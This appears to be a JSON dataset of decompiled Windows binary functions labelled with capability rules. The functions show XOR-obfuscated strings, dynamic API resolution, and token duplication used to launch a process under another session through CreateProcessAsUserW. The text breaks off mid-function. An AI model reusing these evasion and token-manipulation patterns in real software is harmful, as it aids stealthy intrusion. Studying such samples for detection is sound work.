{
    "0040101f": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040101f(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t *piVar12;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_39h;\n    uint var_35h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    code *var_1ch;\n    uint var_18h;\n    int32_t *lpLibFileName;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t dwSize;\n    \n    var_8h = 0xffffffff;\n    var_10h = 5;\n    var_18h = param_2;\n    if (*0x41caa0 == NULL) {\n        var_30h._0_2_ = 0x2e38;\n        var_30h._2_1_ = 8;\n        var_30h._3_1_ = 5;\n        var_2ch = 0x36324a04;\n        var_28h._0_2_ = 0x6900;\n        var_24h = 0x696c5a56;\n        var_20h._0_2_ = 0x6468;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        iVar10 = 0;\n        do {\n            var_ch = 6;\n            puVar1 = iVar10 + lpLibFileName;\n            iVar8 = iVar10 % 6;\n            iVar10 = iVar10 + 1;\n            *puVar1 = *(&var_24h + iVar8) ^ puVar1[&var_30h - lpLibFileName];\n        } while (iVar10 < 10);\n        var_4ch = 0x3b654716;\n        var_48h = 0x674a2a0e;\n        var_44h = 0x562c1837;\n        var_40h._0_2_ = 0x759;\n        var_40h._2_1_ = 5;\n        stack0xffffffbf = 0x23465c3e;\n        var_39h = 0x5b5a2c0a;\n        var_35h._0_2_ = 0x6b20;\n        var_24h = 0x4e343358;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x6b);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        iVar10 = lpLibFileName;\n        iVar11 = 0;\n        do {\n            puVar1 = iVar11 + iVar8;\n            iVar9 = iVar11 % var_10h;\n            iVar11 = iVar11 + 1;\n            *puVar1 = *(&var_24h + iVar9) ^ puVar1[&var_4ch - iVar8];\n        } while (iVar11 < 0x19);\n        uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar8);\n        *0x41caa0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        uVar4 = (*pcVar3)(0, iVar10);\n        (*pcVar2)(uVar4);\n    }\n    dwSize = 0;\n    iVar10 = (**0x41caa0)(5, 0, 0, &dwSize);\n    if (iVar10 == -0x3ffffffc) {\n        dwSize = dwSize + 0x100;\n        piVar5 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n        if (piVar5 != NULL) {\n            lpLibFileName = piVar5;\n            iVar10 = (**0x41caa0)(5, piVar5, dwSize, 0);\n            uVar4 = var_18h;\n            if (-1 < iVar10) {\n                var_8h = 0;\n                piVar12 = piVar5;\n                do {\n                    iVar10 = piVar12[0x11];\n                    if (((iVar10 != 0) && (iVar10 != 4)) && (iVar10 != *0x41ccb8)) {\n                        uVar6 = fcn.00408c39();\n                        uVar7 = fcn.00406047();\n                        iVar10 = (*var_1ch)(piVar12[0xf], uVar7, piVar12[0x11], piVar12[0x12], uVar6, uVar4);\n                        piVar5 = lpLibFileName;\n                        if (iVar10 == 0) break;\n                    }\n                    piVar5 = lpLibFileName;\n                    if (*piVar12 == 0) break;\n                    piVar12 = piVar12 + *piVar12;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar5, 0, 0x8000);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 1367
    },
    "00401fde": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00401fde(int32_t param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t *piVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint var_d0h;\n    int32_t var_c8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint TokenHandle;\n    uint pSessionId;\n    int32_t ProcessHandle;\n    uint hExistingToken;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t *var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t lpApplicationName;\n    uint hObject;\n    uint8_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint8_t var_14h [3];\n    uint var_11h;\n    uint var_dh;\n    uchar var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_50h = 4;\n    var_5ch._0_2_ = 0x1000;\n    piVar7 = param_2;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar7 = 0;\n        piVar7 = piVar7 + 1;\n    }\n    puVar8 = &var_d0h;\n    var_44h = param_2;\n    lpApplicationName = param_1;\n    for (iVar4 = 0x44; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    pSessionId = 0;\n    puVar8 = &var_88h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    hObject = 0;\n    hExistingToken = 0;\n    var_40h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    var_18h._0_2_ = 0xb2c;\n    var_48h = 5;\n    var_18h._2_1_ = 5;\n    stack0xffffffe7 = 0x7416291f;\n    var_11h._0_1_ = 0x5c;\n    var_11h._1_1_ = 0x59;\n    var_11h._2_2_ = 0x2015;\n    var_dh._0_1_ = 0x16;\n    var_dh._1_1_ = 0x47;\n    var_8h = 0x71776e47;\n    var_4h._0_2_ = 0x7a4c;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_4ch = 6;\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + iVar4;\n        iVar5 = iVar9 % 6;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_8h + iVar5) ^ puVar1[var_14h + (-4 - iVar4)];\n    } while (iVar9 < 0xd);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_78h = iVar4;\n    if (ProcessHandle != 0) {\n        var_18h._0_2_ = 0xb2c;\n        var_18h._2_1_ = 5;\n        stack0xffffffe7 = 0x7416291f;\n        var_11h._0_1_ = 0x5c;\n        var_11h._1_1_ = 0x59;\n        var_11h._2_2_ = 0x2015;\n        var_dh._0_1_ = 0x16;\n        var_dh._1_1_ = 0x47;\n        var_8h = 0x71776e47;\n        var_4h._0_2_ = 0x7a4c;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar4 = 0;\n        do {\n            puVar1 = iVar4 + iVar9;\n            iVar5 = iVar4 % var_4ch;\n            iVar4 = iVar4 + 1;\n            *puVar1 = *(&var_8h + iVar5) ^ puVar1[var_14h + (-4 - iVar9)];\n        } while (iVar4 < 0xd);\n        var_58h = iVar9;\n        iVar4 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(lpApplicationName, &pSessionId);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar4 != 0) {\n            var_24h = 0x3b654716;\n            var_20h = 0x674a2a0e;\n            var_1ch = 0x562c1837;\n            var_18h._0_2_ = 0x759;\n            var_18h._2_1_ = 5;\n            stack0xffffffe7 = 0x23465c3e;\n            var_11h._0_1_ = 10;\n            var_11h._1_1_ = 0x2c;\n            var_11h._2_2_ = 0x5b5a;\n            var_dh._0_1_ = 0x20;\n            var_dh._1_1_ = 0x6b;\n            var_30h = 0x4e343358;\n            var_2ch._0_1_ = 0x6b;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar9 = 0;\n            do {\n                puVar1 = iVar9 + iVar4;\n                iVar5 = iVar9 % var_48h;\n                iVar9 = iVar9 + 1;\n                *puVar1 = *(&var_30h + iVar5) ^ puVar1[&var_24h - iVar4];\n            } while (iVar9 < 0x19);\n            var_80h = iVar4;\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            iVar9 = var_58h;\n            pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar5 != 0) {\n                fcn.00402ceb();\n                iVar5 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hObject);\n                pcVar2 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar5 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hObject, 0xc, pSessionId, 4);\n                    iVar9 = 0;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar4 != 0) {\n                        var_84h = 0x20;\n                        var_88h = pSid;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar2)(hObject, 0x19, &var_88h, iVar4 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_7ch = 0;\n                    (*pcVar2)(hObject, 0x1b, &var_7ch, 4);\n                    iVar4 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_40h, hObject, 1);\n                    if (iVar4 == 0) {\n                        var_40h = 0;\n                    }\n                    else {\n                        var_50h = 0x404;\n                    }\n                    var_d0h = 0x44;\n                    var_28h = 0x701e511e;\n                    var_24h = 0x7722691d;\n                    var_20h = 0x51087304;\n                    var_1ch = 0x692f7047;\n                    var_18h._0_2_ = 0x7735;\n                    var_18h._2_1_ = 0x15;\n                    stack0xffffffe7 = 0x16510f73;\n                    var_11h._0_1_ = 0x70;\n                    var_11h._1_1_ = 6;\n                    var_11h._2_2_ = 0x3d69;\n                    var_dh._0_1_ = 0x77;\n                    var_dh._1_1_ = 4;\n                    var_dh._2_1_ = 0x73;\n                    var_dh._3_1_ = 0x69;\n                    var_9h = 0x51;\n                    var_30h = 0x70775169;\n                    var_2ch._0_1_ = 0x73;\n                    uVar3 = (*pcVar6)(8, 0x41);\n                    var_3ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    lpApplicationName = &var_28h - var_3ch;\n                    do {\n                        puVar1 = iVar9 + var_3ch;\n                        iVar4 = iVar9 % var_48h;\n                        iVar9 = iVar9 + 1;\n                        *puVar1 = *(&var_30h + iVar4) ^ puVar1[lpApplicationName];\n                    } while (iVar9 < 0x20);\n                    var_20h = 0x632e4c11;\n                    var_1ch = 0x58246226;\n                    var_18h._0_2_ = 0x450c;\n                    var_18h._2_1_ = 0x11;\n                    stack0xffffffe7 = 0x6b632c4c;\n                    var_11h._0_1_ = 0x62;\n                    var_11h._1_1_ = 0x29;\n                    var_11h._2_2_ = 7000;\n                    var_dh._0_1_ = 0x45;\n                    var_dh._1_1_ = 7;\n                    var_dh._2_1_ = 0x4c;\n                    var_dh._3_1_ = 0x58;\n                    var_9h = 99;\n                    var_30h = 0x63584c62;\n                    var_2ch._0_1_ = 0x45;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n                    lpApplicationName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar4 = 0;\n                    var_54h = &var_20h - lpApplicationName;\n                    do {\n                        puVar1 = iVar4 + lpApplicationName;\n                        iVar9 = iVar4 % var_48h;\n                        iVar4 = iVar4 + 1;\n                        *puVar1 = *(&var_30h + iVar9) ^ puVar1[var_54h];\n                    } while (iVar4 < 0x18);\n                    var_c8h = var_3ch;\n                    var_a0h._0_2_ = 0;\n                    var_a4h = 1;\n                    var_1ch = 0x6b57336b;\n                    var_18h._0_2_ = 0x4931;\n                    var_18h._2_1_ = 0x11;\n                    stack0xffffffe7 = 0x69424772;\n                    var_11h._0_1_ = 0x33;\n                    var_11h._1_1_ = 0x57;\n                    var_11h._2_2_ = 0x316b;\n                    var_dh._0_1_ = 0x49;\n                    var_dh._1_1_ = 0x33;\n                    var_dh._2_1_ = 0x72;\n                    var_8h = 0x6b723349;\n                    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x42);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    var_54h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar4 = 0;\n                    var_30h = &var_1ch - var_54h;\n                    do {\n                        puVar1 = iVar4 + var_54h;\n                        iVar9 = iVar4 % var_48h;\n                        iVar4 = iVar4 + 1;\n                        *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_1ch - var_54h];\n                    } while (iVar4 < 0x12);\n                    iVar9 = 0;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hObject, lpApplicationName, 0, 0, 0, 0, var_50h, var_40h, 0, &var_d0h, var_44h);\n                    var_1ch = 0x6415532e;\n                    var_18h._0_2_ = 0x503e;\n                    var_18h._2_1_ = 0x23;\n                    stack0xffffffe7 = 0x39641353;\n                    var_11h._0_1_ = 0x50;\n                    var_11h._1_1_ = 0x38;\n                    var_11h._2_2_ = 0xb53;\n                    var_dh._0_1_ = 100;\n                    var_dh._1_1_ = 0x50;\n                    var_dh._2_1_ = 0x50;\n                    var_8h = 0x64645356;\n                    var_4h._0_2_ = 0x5050;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    var_30h = &var_1ch - iVar4;\n                    do {\n                        puVar1 = iVar9 + iVar4;\n                        iVar5 = iVar9 % var_4ch;\n                        iVar9 = iVar9 + 1;\n                        *puVar1 = *(&var_8h + iVar5) ^ puVar1[&var_1ch - iVar4];\n                    } while (iVar9 < 0x12);\n                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    var_50h = iVar4;\n                    if (*var_44h != 0) {\n                        stack0xffffffe7 = stack0xffffffe7 & 0xff | 0x273b1100;\n                        var_11h._0_1_ = 0x62;\n                        var_11h._1_1_ = 0x2a;\n                        var_11h._2_2_ = 0x2704;\n                        var_dh._0_1_ = 0x20;\n                        var_dh._1_1_ = 0x26;\n                        var_dh._2_1_ = 0x30;\n                        var_8h = 0x304b4f43;\n                        var_4h._0_2_ = 0x6a4b;\n                        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                        iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar4 = 0;\n                        var_30h = var_14h + -iVar9;\n                        do {\n                            puVar1 = iVar4 + iVar9;\n                            iVar5 = iVar4 % var_4ch;\n                            iVar4 = iVar4 + 1;\n                            *puVar1 = *(&var_8h + iVar5) ^ puVar1[var_14h + -iVar9];\n                        } while (iVar4 < 10);\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*var_44h, 0x201eb, &TokenHandle);\n                        iVar4 = var_50h;\n                        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (iVar5 != 0) {\n                            fcn.00402ceb();\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n                        }\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_44h[1]);\n                        uVar3 = (*pcVar6)(0, iVar9);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    }\n                    iVar9 = var_54h;\n                    if (var_40h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_40h);\n                    }\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n                    uVar3 = (*pcVar6)(0, iVar4);\n                    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*pcVar6)(0, iVar9);\n                    (*pcVar2)(uVar3);\n                    uVar3 = (*pcVar6)(0, lpApplicationName);\n                    (*pcVar2)(uVar3);\n                    uVar3 = (*pcVar6)(0, var_3ch);\n                    (*pcVar2)(uVar3);\n                    iVar4 = var_80h;\n                    iVar9 = var_58h;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(hExistingToken);\n            }\n            uVar3 = (*pcVar6)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        iVar4 = var_78h;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(ProcessHandle);\n        uVar3 = (*pcVar6)(0, iVar9);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    iVar9 = *var_44h;\n    uVar3 = (*pcVar6)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return iVar9;\n}\n",
        "token_count": 4514
    },
    "00402a0d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00402a0d(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint var_34h;\n    ushort var_30h;\n    uchar var_2eh;\n    uint var_2dh;\n    uint var_29h;\n    uchar uStack41;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    code *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_34h._0_2_ = 0xb2c;\n    var_10h = 5;\n    var_34h._2_1_ = 5;\n    var_34h._3_1_ = 0x1f;\n    var_30h = 0x1629;\n    var_2eh = 0x74;\n    var_2dh = 0x2015595c;\n    var_29h._0_1_ = 0x16;\n    var_29h._1_1_ = 0x47;\n    var_24h = 0x71776e47;\n    var_20h._0_2_ = 0x7a4c;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_4h = 6;\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + var_ch;\n        iVar6 = iVar9 % 6;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_24h + iVar6) ^ puVar1[&var_34h - var_ch];\n    } while (iVar9 < 0xd);\n    var_30h = 0x5c10;\n    var_2eh = 2;\n    var_2dh = 0x39311806;\n    var_29h._0_1_ = 0x58;\n    var_29h._1_1_ = 0x2d;\n    var_29h._2_1_ = 0x62;\n    var_24h = 0x626c3556;\n    var_20h._0_2_ = 0x4559;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + var_14h;\n        iVar6 = iVar9 % var_4h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_24h + iVar6) ^ puVar1[&var_30h - var_14h];\n    } while (iVar9 < 10);\n    var_34h._0_2_ = 0x2531;\n    var_34h._2_1_ = 0x1d;\n    var_34h._3_1_ = 0x12;\n    var_30h = 0x2f17;\n    var_2eh = 0x30;\n    var_2dh = 0x37141c20;\n    var_29h._0_1_ = 0x37;\n    var_29h._1_1_ = 0x19;\n    var_29h._2_1_ = 0x24;\n    var_29h._3_1_ = 0x33;\n    uStack41 = 0x70;\n    var_24h = 0x70724976;\n    var_20h._0_2_ = 0x4376;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = var_ch;\n    iVar6 = 0;\n    var_18h = &var_34h - var_1ch;\n    do {\n        puVar1 = iVar6 + var_1ch;\n        iVar7 = iVar6 % var_4h;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_24h + iVar7) ^ puVar1[&var_34h - var_1ch];\n        pcVar4 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    } while (iVar6 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_ch, var_1ch);\n    var_18h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    iVar6 = var_14h;\n    uVar3 = (*pcVar4)(iVar9, var_14h);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    uVar3 = var_8h;\n    iVar2 = (*pcVar4)(var_8h);\n    if (iVar2 == 0) {\n        iVar2 = (*var_18h)(uVar3);\n        if (iVar2 == 0) {\n            var_34h._0_2_ = 0x592b;\n            var_34h._2_1_ = 0x2c;\n            var_34h._3_1_ = 0x25;\n            var_30h = 0x58;\n            var_2eh = 0x74;\n            var_2dh = 0x18782327;\n            var_29h._0_1_ = 0x5a;\n            var_29h._1_1_ = 0x2e;\n            var_29h._2_1_ = 6;\n            var_29h._3_1_ = 0x39;\n            var_24h = 0x4743356c;\n            var_20h._0_1_ = 0x39;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n            var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar9 = 0;\n            do {\n                puVar1 = iVar9 + var_4h;\n                iVar6 = iVar9 % var_10h;\n                iVar9 = iVar9 + 1;\n                *puVar1 = *(&var_24h + iVar6) ^ puVar1[&var_34h - var_4h];\n            } while (iVar9 < 0xf);\n            var_30h = 0x3018;\n            var_2eh = 0x2a;\n            var_2dh = 0x39364405;\n            var_29h._0_1_ = 0xf;\n            var_29h._1_1_ = 0x44;\n            var_24h = 0x444e5459;\n            var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x30);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar9 = var_ch;\n            iVar7 = 0;\n            var_18h = &var_30h - iVar6;\n            do {\n                puVar1 = iVar7 + iVar6;\n                iVar8 = iVar7 % var_10h;\n                iVar7 = iVar7 + 1;\n                *puVar1 = *(&var_24h + iVar8) ^ (&var_30h - iVar6)[puVar1];\n            } while (iVar7 < 9);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_ch, iVar6);\n            pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar9, var_4h);\n            pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n            (*pcVar5)(var_8h);\n            (*pcVar4)(var_8h);\n            pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar4)(0, var_4h);\n            (*pcVar5)(uVar3);\n            var_10h = 1;\n            iVar6 = var_14h;\n            goto code_r0x00402cbd;\n        }\n    }\n    var_10h = 0;\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\ncode_r0x00402cbd:\n    uVar3 = (*pcVar4)(0, var_1ch);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar4)(0, iVar6);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar4)(0, iVar9);\n    (*pcVar5)(uVar3);\n    return var_10h;\n}\n",
        "token_count": 2220
    },
    "00404bd0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00404bd0(uint param_1, uchar *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uchar *var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint hObject;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_43h;\n    uint var_3fh;\n    uchar var_39h;\n    int32_t var_38h;\n    int32_t lpLibFileName;\n    uint dwBytes;\n    uint *var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    code *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar10 = &var_80h;\n    var_60h = param_2;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_68h = *0x41ccb8;\n    var_64h = 0;\n    dwBytes = 0;\n    var_5ch = 0;\n    var_20h = 0x5;\n    var_ch = 0x5082e38;\n    var_8h = 0x36324a04;\n    var_4h._0_1_ = 0;\n    var_4h._1_1_ = 0x69;\n    var_1ch = 0x696c5a56;\n    var_18h._0_2_ = 0x6468;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_2ch = 0x6;\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + lpLibFileName;\n        iVar6 = iVar5 % 6;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_1ch + iVar6) ^ puVar1[&var_ch - lpLibFileName];\n    } while (iVar5 < 10);\n    var_10h = 0x192a1a20;\n    var_ch = 0x173d140a;\n    var_8h = 0x1e1f0c06;\n    var_4h._0_1_ = 0x16;\n    var_4h._1_1_ = 0x69;\n    var_1ch = 0x69656d7a;\n    var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x6f);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = lpLibFileName;\n    iVar8 = 0;\n    var_38h = iVar5;\n    do {\n        puVar1 = iVar8 + iVar5;\n        iVar7 = iVar8 % var_20h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_1ch + iVar7) ^ puVar1[&var_10h - iVar5];\n    } while (iVar8 < 0xe);\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    var_80h = 0x18;\n    var_7ch = 0;\n    var_74h = 0;\n    var_78h = 0;\n    var_70h = 0;\n    var_6ch = 0;\n    iVar8 = (*pcVar4)(&var_58h, 0x400, &var_80h, &var_68h);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (-1 < iVar8) {\n        var_14h = 0x2a27466e;\n        var_10h = 0x4364170e;\n        var_ch = 0xa0e3907;\n        var_8h = 0x31076547;\n        var_4h._0_1_ = 0xe;\n        var_4h._1_1_ = 0x17;\n        var_4h._2_1_ = 0x34;\n        var_28h = 0x5a683134;\n        var_24h._0_2_ = 0x796b;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n        var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = lpLibFileName;\n        iVar5 = 0;\n        do {\n            puVar1 = iVar5 + var_1ch;\n            iVar8 = iVar5 % 